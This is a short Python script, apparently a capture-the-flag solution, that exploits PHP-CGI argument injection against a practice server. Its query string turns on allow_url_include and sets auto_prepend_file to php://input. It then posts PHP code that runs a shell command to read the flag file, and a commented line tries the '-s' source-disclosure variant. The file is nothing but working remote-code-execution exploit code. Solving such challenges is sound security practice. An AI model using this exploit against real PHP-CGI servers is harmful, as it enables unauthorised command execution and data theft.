import requests
postdata = """<?php system('cat flag_flag_flag.txt'); die();?>"""

url = """http://ctfq.sweetduet.info:10080/~q12/?-d+allow_url_include%3DOn+-d+auto_prepend_file%3Dphp://input"""
#url = """http://ctfq.sweetduet.info:10080/~q12/?-s"""
hax = requests.post(url,postdata)
print hax.text
